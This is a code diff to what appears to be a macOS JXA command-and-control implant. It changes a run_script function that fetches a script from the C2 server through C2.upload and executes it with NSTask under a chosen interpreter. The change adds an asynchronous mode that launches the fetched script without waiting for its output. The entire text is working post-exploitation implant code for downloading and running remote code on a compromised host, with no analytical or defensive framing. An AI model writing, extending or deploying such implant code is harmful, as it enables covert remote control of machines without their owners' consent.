@@ -6,6 +6,8 @@ exports.run_script = function(task, command, params){
         let script = "";
         let args = [];
         let timeoutSeconds = 1800;
+        let synchronous = true;
+        let responsepy = "";
         if(config.hasOwnProperty("file")){
             let script_data = C2.upload(task, config['file']);
             if(typeof script_data === "string"){
@@ -13,7 +15,7 @@ exports.run_script = function(task, command, params){
             }
             script = $.NSString.alloc.initWithDataEncoding(script_data, $.NSUTF8StringEncoding);
         } else {
-            return {"user_output": "missing file parameter", "completed": true, "status": "error"}
+            return {"user_output": "missing file parameter", "completed": true, "status": "error"};
         }
         if(config.hasOwnProperty("interpreter")){
             program_path = config["interpreter"];
@@ -23,6 +25,9 @@ exports.run_script = function(task, command, params){
         }
         if(config.hasOwnProperty("timeout")){
             timeoutSeconds = config["timeout"];
+        }
+        if(config.hasOwnProperty("async")){
+            synchronous = !config["async"];
         }
         let inputData = script.dataUsingEncoding($.NSUTF8StringEncoding);
         // Prepare NSTask
@@ -47,6 +52,8 @@ exports.run_script = function(task, command, params){
         // Launch task
         script_task.launch;
 
+        // If synchronous start timeout and get output
+        if (synchronous) {
         // Start Timeout
         const start = $.NSDate.date;
         while (script_task.isRunning) {
@@ -72,7 +79,11 @@ exports.run_script = function(task, command, params){
         // Aggregate Response
         let response1py = ObjC.unwrap(outputString);
         let response2py = ObjC.unwrap(errorString);
-        let responsepy = response1py + response2py;
+        responsepy = response1py + response2py;
+        }
+        else {
+            responsepy = "+ Asynchronous Task Created +";
+        }
         return {"user_output":responsepy, "completed": true};
      }catch(error){
         return {"user_output":error.toString(), "completed": true, "status": "error"};
